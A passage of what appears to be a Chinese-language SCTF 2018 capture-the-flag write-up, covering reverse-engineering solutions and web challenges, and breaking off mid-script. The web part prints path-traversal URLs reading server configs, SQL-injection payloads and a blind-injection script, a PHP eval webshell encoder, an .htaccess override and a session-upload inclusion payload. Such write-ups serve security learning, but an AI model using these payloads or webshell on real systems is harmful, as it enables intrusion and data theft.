class="line">19</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">"data"</span>,<span class="string">"rb"</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">code = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(data)):</span><br><span class="line">    v = ord(data[i])</span><br><span class="line">    vv = <span class="number">0</span></span><br><span class="line">    <span class="comment"># flip bits</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">        k = v &amp; (<span class="number">1</span> &lt;&lt; j)</span><br><span class="line">        k &gt;&gt;= j</span><br><span class="line">        k &lt;&lt;= <span class="number">7</span>-j</span><br><span class="line">        vv |= k</span><br><span class="line">    code+=chr(vv)</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"code"</span>,<span class="string">"wb"</span>)</span><br><span class="line">f.write(code)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>flag解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># byte_412038</span></span><br><span class="line">a = \</span><br><span class="line">[</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0x61</span>, <span class="number">0x77</span>, <span class="number">0x62</span>, <span class="number">0x7E</span>, <span class="number">0x07</span>, <span class="number">0x35</span>, <span class="number">0x2E</span>, </span><br><span class="line">    <span class="number">0x26</span>, <span class="number">0x24</span>, <span class="number">0x31</span>, <span class="number">0x38</span>, <span class="number">0x28</span>, <span class="number">0x12</span>, <span class="number">0x35</span>, <span class="number">0x07</span>, </span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x2F</span>, <span class="number">0x0F</span>, <span class="number">0x26</span>, <span class="number">0x34</span>, <span class="number">0x71</span>, <span class="number">0x25</span>, </span><br><span class="line">    <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x27</span>, <span class="number">0x37</span>, <span class="number">0x24</span>, <span class="number">0x32</span>, <span class="number">0x23</span>, <span class="number">0x0B</span>, </span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x0E</span>, <span class="number">0x1F</span>, <span class="number">0x0F</span>, <span class="number">0x52</span>, <span class="number">0x5B</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">38</span>):</span><br><span class="line">    a[i] ^= i+<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>, <span class="number">37</span>):</span><br><span class="line">    a[i] ^= <span class="number">0x30</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>, <span class="number">37</span>):</span><br><span class="line">    a[i] ^= [<span class="number">0x73</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0x66</span>][(i<span class="number">-5</span>) % <span class="number">4</span>]</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">38</span>):</span><br><span class="line">    flag+=chr(a[i])</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><blockquote><p><code>flag: sctf{Babymips_iS_so_ea5y_yoooooooooo!}</code></p></blockquote><h2><span id="crackme2">crackme2</span></h2><p>fork进程用断点通信, 子进程 <code>sub_3E74</code> 解密, 父进程<code>sub_3940</code>比较. 用链表保存字符串"We1co3t0lmel2eV", ptrace到断点时取子进程r0寄存器比较.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0xEF</span>, <span class="number">0x145</span>, <span class="number">0x93</span>, <span class="number">0x134</span>, <span class="number">0x132</span>]</span><br><span class="line">secret = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">"We1co3t0lmel2eV"</span>]</span><br><span class="line">a = \</span><br><span class="line">[</span><br><span class="line">    [(key[i] - secret[<span class="number">0</span>  + i]) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">5</span>)],</span><br><span class="line">    [(key[i] - secret[<span class="number">5</span>  + i]) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">5</span>)],</span><br><span class="line">    [(key[i] - secret[<span class="number">10</span> + i]) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">5</span>)],</span><br><span class="line">]</span><br><span class="line">flag = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">15</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">    v = (a[<span class="number">0</span>][i] + a[<span class="number">1</span>][i] + a[<span class="number">2</span>][i]) / <span class="number">2</span></span><br><span class="line">    flag[<span class="number">0</span> + i] = v - a[<span class="number">0</span>][i]</span><br><span class="line">    flag[<span class="number">5</span> + (i + <span class="number">1</span>) % <span class="number">5</span>] = v - a[<span class="number">1</span>][i]</span><br><span class="line">    flag[<span class="number">10</span> + (i + <span class="number">2</span>) % <span class="number">5</span>] = v - a[<span class="number">2</span>][i]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">15</span>):</span><br><span class="line">    s += chr(flag[i])</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><blockquote><p><code>flag: We1com3t0leVel2</code></p></blockquote><h2><span id="simple">simple</span></h2><p>test.zip用rc4解密得到dex文件. 反编译后抠代码穷举每组符合条件的字符.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">53 5</span><br><span class="line">55 7</span><br><span class="line">61 =</span><br><span class="line">63 ?</span><br><span class="line">85 U</span><br><span class="line">87 W</span><br><span class="line">93 ]</span><br><span class="line">95 _</span><br><span class="line">117 u</span><br><span class="line">119 w</span><br><span class="line">125 &#125;</span><br><span class="line">-------------------</span><br><span class="line">81 Q</span><br><span class="line">83 S</span><br><span class="line">85 U</span><br><span class="line">87 W</span><br><span class="line">89 Y</span><br><span class="line">91 [</span><br><span class="line">93 ]</span><br><span class="line">95 _</span><br><span class="line">113 q</span><br><span class="line">115 s</span><br><span class="line">117 u</span><br><span class="line">119 w</span><br><span class="line">121 y</span><br><span class="line">123 &#123;</span><br><span class="line">125 &#125;</span><br><span class="line">-------------------</span><br><span class="line">57 9</span><br><span class="line">59 ;</span><br><span class="line">61 =</span><br><span class="line">63 ?</span><br><span class="line">89 Y</span><br><span class="line">91 [</span><br><span class="line">93 ]</span><br><span class="line">95 _</span><br><span class="line">121 y</span><br><span class="line">123 &#123;</span><br><span class="line">125 &#125;</span><br></pre></td></tr></table></figure><p>每组取前八个字符即为flag.</p><blockquote><p><code>flag: SCTF{57=?UW]_QSUWY[]_9;=?Y[]_}</code></p></blockquote><h1><span id="0x04-web">0x04 Web</span></h1><h2><span id="zhuanxv">Zhuanxv</span></h2><p>通过报错知道服务器中间件是tomcat</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7d0a5ee0-75fc-1.png"></p><p>80端口有apache默认页 github搜了一下发现后台登录页面 http://121.196.195.244:9032/zhuanxvlogin存在url http://121.196.195.244:9032/list</p><p>http://121.196.195.244:9032/loadimage?fileName=web_login_bg.jpg ⬆️这个url极其可疑,下载的文件竟然是bg.jpg</p><p>下载javaweb配置文件，发现是struts2项目 http://121.196.195.244:9032/loadimage?fileName=../../WEB-INF/web.xml</p><p>下载struts2配置文件 http://121.196.195.244:9032/loadimage?fileName=../../WEB-INF/classes/struts.xml</p><p>用 http://121.196.195.244:9032/loadimage?fileName=../../WEB-INF/classes/com/xxxxxxx.class 读取java编译后的文件并反编译得到源码 读取登陆部分的逻辑源码发现过滤不严格加上拼接参数，存在注入</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7d2241b8-75fc-1.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7d3fdc00-75fc-1.png"></p><p>构造payload如下 /zhuanxvlogin?user.name=admin%27%0Aor%0A%271%27%3E%270'%0Aor%0Aname%0Alike%0A'admin&amp;user.password=1</p><p>结合前面读取到的adminaction类可以列目录 http://121.196.195.244:9032/list?pathName=/opt/tomcat/webapps/ROOT/WEB-INF/classes/com/cuitctf/po 读取WEB-INF/classes/com/cuitctf/po/Flag.class 反编译后是个flag的映射类，感觉flag在数据库中，读取cfg.xml映射文件，确定flag在数据库中</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171312-7d4eb32e-75fc-1.png"></p><p>构造盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    p=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">  payload=<span class="string">"(select%0Aascii(substr(id,"</span>+str(i)+<span class="string">",1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;'"</span>+str(j)+<span class="string">"'"</span></span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        url=<span class="string">"http://121.196.195.244:9032/zhuanxvlogin?user.name=admin'%0Aor%0A"</span>+payload+<span class="string">"%0Aor%0Aname%0Alike%0A'admin&amp;user.password=1"</span></span><br><span class="line">        r1=s.get(url)</span><br><span class="line">        <span class="comment">#print url</span></span><br><span class="line">        <span class="comment">#print len(r1.text)</span></span><br><span class="line">        <span class="keyword">if</span> len(r1.text)&gt;<span class="number">20000</span> <span class="keyword">and</span> p!=<span class="string">''</span>:</span><br><span class="line">            flag+=p</span><br><span class="line">            <span class="keyword">print</span> i,flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        p=chr(j)</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7d787fec-75fc-1.png"></p><blockquote><p><code>flag:sctf{C46E250926A2DFFD83197539622B08E}</code></p></blockquote><h2><span id="easiest-web-phpmyadmin">easiest web - phpmyadmin</span></h2><p>账号密码都是root 顺手把密码改成HackMe1n 估计是被发现了 被改回去了...不知道啥密码 开了3389,系统是windows 通过报错爆www路径：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7d8b6634-75fc-1.png"></p><p>直接写文件写不了 通过sql日志文件写shell</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7da06d54-75fc-1.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dafe018-75fc-1.png"></p><p>菜刀连上去： <img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dba084a-75fc-1.png"></p><blockquote><p><code>flag:sctf{31cf2213cc49605a30f07395d6e5b9c4}</code></p></blockquote><h2><span id="babysyc-simple-php-web">BabySyc - Simple PHP Web</span></h2><p>这题是比赛结束后才做出来的 ### 预期解 看到文件包含和伪协议, 读他喵的, 读login.php发现是加密过的, 所以要先寻找so拓展的名字和位置, 最后找到: php.ini : /etc/php/5.6/apache2/php.ini encrypt_php.so : /usr/lib/php/20131226/encrypt_php.so 读出来之后交给逆向师傅...... 经过逆向大佬的一翻努力： login.php <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($lemon_flag)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'No!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h1&gt; Admin Login &lt;/h1&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span> value=<span class="string">""</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"pass"</span> value=<span class="string">""</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] === <span class="string">'admin'</span> &amp;&amp; $_POST[<span class="string">'pass'</span>] === <span class="string">'sctf2018_h656cDBkU2'</span>) &#123;</span><br><span class="line">$_SESSION[<span class="string">'admin'</span>] = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'&lt;script&gt;alert(/Login Error!/)&lt;/script&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//admin view</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@$_SESSION[<span class="string">'admin'</span>] === <span class="number">1</span>) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">"./?f=upload_sctf2018_C9f7y48M75.php"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> value=<span class="string">""</span> name=<span class="string">"upload"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"submit"</span> name=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>upload_sctf2018_C9f7y48M75.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($lemon_flag)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'No!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@$_SESSION[<span class="string">'admin'</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'403.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip = sha1(md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . <span class="string">"sctf2018"</span>));</span><br><span class="line">$user_dir = <span class="string">'./upload_7788/'</span> . $ip;</span><br><span class="line"><span class="keyword">if</span> (!is_dir($user_dir)) &#123;</span><br><span class="line">mkdir($user_dir);</span><br><span class="line">touch($user_dir . <span class="string">'/index.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">$typeAccepted = [<span class="string">"image/jpeg"</span>, <span class="string">"image/gif"</span>, <span class="string">"image/png"</span>];</span><br><span class="line">$blackext = [<span class="string">"php"</span>, <span class="string">"php3"</span>, <span class="string">"php4"</span>, <span class="string">"php5"</span>, <span class="string">"pht"</span>, <span class="string">"phtml"</span>, <span class="string">"phps"</span>, <span class="string">"inc"</span>];</span><br><span class="line">$filearr = pathinfo($_FILES[<span class="string">"upload"</span>][<span class="string">"name"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($_FILES[<span class="string">"upload"</span>][<span class="string">'type'</span>], $typeAccepted)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"type error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (in_array($filearr[<span class="string">"extension"</span>], $blackext)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"extension error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$target_path = $user_dir . <span class="string">'/'</span>;</span><br><span class="line">$target_path .= basename($_FILES[<span class="string">'upload'</span>][<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!move_uploaded_file($_FILES[<span class="string">'upload'</span>][<span class="string">'tmp_name'</span>], $target_path)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'upload error!'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'succesfully uploaded! dir: '</span> . $user_dir . <span class="string">"/"</span> . $_FILES[<span class="string">'upload'</span>][<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;script&gt;alert('please upload image.')&lt;/script&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把文件上传后在index.php处包含会提示NoNoNo，猜测上传目录upload_7788被过滤,/tmp也被过滤 in_array区分大小写 可以用PHP绕过,但是上传上去之后发现不解析,猜测在.htaccess中关闭了php_flag engine, 于是先在本文件夹上传一个.htaccess覆盖 php_flag engine的值, 再加一个PHP解析type, 最后.htaccess文件如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddTypeapplication/x-httpd-php.xxx</span><br><span class="line">php_flag engine 1</span><br></pre></td></tr></table></figure><p>最后上传一个加密过后的shell就ok了</p><p>附上加解密python脚本 encode.py</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import hashlib</span><br><span class="line">import zlib</span><br><span class="line"></span><br><span class="line">outfile = 'shell.xxx'</span><br><span class="line"></span><br><span class="line">content = '''&lt;?php echo 'Works!'; eval($_POST[a]); ?&gt;'''</span><br><span class="line">if len(content)%16!=0:</span><br><span class="line">content=content+str((16-len(content)%16)*'0')</span><br><span class="line"></span><br><span class="line">md5t = hashlib.md5()</span><br><span class="line">md5t.update(<span class="string">"YP68y3FsMDc6TvRgghq"</span>)</span><br><span class="line">key = md5t.hexdigest()</span><br><span class="line">iv = key[:16]</span><br><span class="line"><span class="comment"># print(key, iv)</span></span><br><span class="line">dec = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">buf1 = dec.encrypt(content)</span><br><span class="line"></span><br><span class="line">buf1 = zlib.compress(buf1)</span><br><span class="line"></span><br><span class="line">buf0 = ''</span><br><span class="line">i = 0</span><br><span class="line">ch = ord(buf1[i])</span><br><span class="line">while ch:</span><br><span class="line">buf0 += chr(ch ^ 0x9A)</span><br><span class="line">i += 1</span><br><span class="line">ch = ord(buf1[i])</span><br><span class="line">buf0 += buf1[i:]</span><br><span class="line"></span><br><span class="line">srclen = len(content)</span><br><span class="line">dstlen = len(buf0)</span><br><span class="line">head = struct.pack('&lt;QQ',srclen,dstlen)</span><br><span class="line"></span><br><span class="line">with open(outfile,'wb') as f:</span><br><span class="line">f.write(head + buf0)</span><br></pre></td></tr></table></figure><p>decode.py</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import hashlib</span><br><span class="line">import zlib</span><br><span class="line"></span><br><span class="line">infile = 'index2.php'</span><br><span class="line"><span class="comment"># path1 = dirr + "5.php"</span></span><br><span class="line"></span><br><span class="line">f0 = open(infile, <span class="string">"rb"</span>)</span><br><span class="line">dstlen = srclen = 0</span><br><span class="line">dstlen,srclen = struct.unpack(<span class="string">"&lt;QQ"</span>,f0.read(16))</span><br><span class="line">buf0 = f0.read(srclen)</span><br><span class="line">f0.close()</span><br><span class="line">print(hex(dstlen), hex(srclen))</span><br><span class="line"></span><br><span class="line"><span class="comment"># f1 = open(path1, "wb")</span></span><br><span class="line">buf1 = <span class="string">""</span></span><br><span class="line">i = 0</span><br><span class="line">ch = ord(buf0[i])</span><br><span class="line"><span class="section">while(ch):</span></span><br><span class="line">    buf1 += chr(ch ^ 0x9A)</span><br><span class="line">    i+=1</span><br><span class="line">    if i == 299:</span><br><span class="line">    break</span><br><span class="line">    ch = ord(buf0[i])</span><br><span class="line">buf1 += buf0[i:]</span><br><span class="line"></span><br><span class="line">buf1 = zlib.decompress(buf1)</span><br><span class="line"></span><br><span class="line">md5t = hashlib.md5()</span><br><span class="line">md5t.update(<span class="string">"YP68y3FsMDc6TvRgghq"</span>)</span><br><span class="line">key = md5t.hexdigest()</span><br><span class="line">iv = key[:16]</span><br><span class="line"><span class="comment"># print(key, iv)</span></span><br><span class="line">dec = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">buf1 = dec.decrypt(buf1)</span><br><span class="line"><span class="comment"># f1.write(buf1)</span></span><br><span class="line">print buf1</span><br></pre></td></tr></table></figure><p>flag在<code>/tmp/flag_56CcE97QGNxDEXNpW3HY</code> &gt; <code>flag:SCTF{f9466264088306fa2600349f290866c2}</code></p><p>赞美re师傅!</p><h3><span id="非预期解">非预期解</span></h3><p>session upload是非预期解 关于session upload给几个参考链接： https://xz.aliyun.com/t/2148 http://php.net/manual/zh/session.upload-progress.php http://skysec.top/2018/04/04/amazing-phpinfo/</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dcda382-75fc-1.png"></p><p>文件包含读phpinfo http://116.62.71.206:52872/?f=phpinfo.php</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7ddab932-75fc-1.png"> 开了 <code>session.upload_progress.enabled = on</code> 说明可以覆盖session 开了<code>clean up</code>说明需要竞争 竞争脚本附在最下方</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7de5ddbc-75fc-1.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171314-7df2a31c-75fc-1.png"> 这里实际上包含的session内容是： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin|i:1;upload_progress_&lt;?php echo file_get_contents(&quot;/tmp/flag_56CcE97QGNxDEXNpW3HY&quot;);?&gt;|a:5:&#123;s:10:&quot;start_time&quot;;i:1529519759;s:14:&quot;content_length&quot;;i:90736;s:15:&quot;bytes_processed&quot;;i:5291;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:6:&quot;upload&quot;;s:4:&quot;name&quot;;s:7:&quot;tmp.jpg&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1529519759;s:15:&quot;bytes_processed&quot;;i:0;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p><h4><span id="踩过的坑点">踩过的坑点</span></h4><p>这道题调用了so来实现php的加解密，这里的文件包含调用了加密的index.php，所以要include也是include加密的php代码，但是这里的session只能控制<code>&lt;?php echo file_get_contents("/tmp/flag_56CcE97QGNxDEXNpW3HY");?&gt;</code>，最多也只是将session中的该片段进行加密，session其余的内容未加密也会导致解密出错</p><p>幸亏这题为了让选手能使用php伪协议，留了个直接php解析，不需要加密的"后门"，只判断了<code>://</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180622171314-7e18a3dc-75fc-1.png"></p><p>所以可以用payload绕过加解密步骤，来include session并直接调用php解析</p><p>http://116.62.71.206:52872/?f=aa://../../../../var/lib/php/sessions/sess_qc2kavokdjiiepu283hduivod2</p><p>SessionUpload.py <figure class="highlight python"><table><tr><td class="gutter"><pre><span 